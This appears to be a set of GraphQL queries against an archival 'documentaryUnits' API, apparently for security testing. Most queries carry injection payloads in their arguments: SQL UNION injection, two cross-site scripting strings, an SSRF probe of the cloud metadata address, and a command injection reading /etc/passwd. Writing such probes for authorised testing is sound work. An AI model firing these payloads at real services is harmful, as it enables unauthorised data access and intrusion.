query.query:
query {
  documentaryUnits(first: 10) {
    items {
      id
      identifier
    }
    pageInfo {
      hasNextPage
    }
  }
}

query {
  documentaryUnits(after: "0' UNION SELECT id, NULL FROM documentary_units--") {
    items {
      id
      identifier
    }
  }
}

query {
  documentaryUnits(after: "javascript:alert('XSS')") {
    items {
      descriptions {
        scopeAndContent
        archivalHistory
      }
    }
  }
}

query {
  documentaryUnits(from: "http://169.254.169.254/latest/meta-data/") {
    items {
      repository {
        descriptions {
          webpage
        }
      }
    }
  }
}

query {
  documentaryUnits(after: "| cat /etc/passwd #") {
    items {
      systemEvents {
        logMessage
      }
    }
  }
}

query {
  documentaryUnits(after: "<img src=x onerror=alert('HTMLi')>") {
    items {
      descriptions {
        rulesAndConventions
      }
    }
  }
}

query {
  mainQuery: documentaryUnits(first: 50) {
    items { id }
  }
  altQuery: documentaryUnits(topLevel: true) {
    items { identifier }
  }
}

query Introspection {
  documentaryUnits {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
